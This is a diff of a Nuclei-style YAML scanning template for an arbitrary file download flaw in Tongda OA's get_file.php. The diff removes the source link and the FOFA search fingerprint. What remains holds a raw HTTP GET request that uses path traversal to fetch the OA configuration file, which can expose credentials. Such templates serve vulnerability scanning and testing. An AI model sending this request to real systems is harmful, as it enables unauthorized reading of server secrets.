@@ -3,12 +3,8 @@ info:
   name: 通达OA get_file任意文件下载漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/go0bgfohcaibpk3l'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: go0bgfohcaibpk3l
-    fofa: title="office Anywhere" && icon_hash="-759108386" && "2011"
 http:
 - raw:
   - 'GET /module/AIP/get_file.php?MODULE=/&ATTACHMENT_NAME=php&ATTACHMENT_ID=.._webroot/inc/oa_config HTTP/1.1
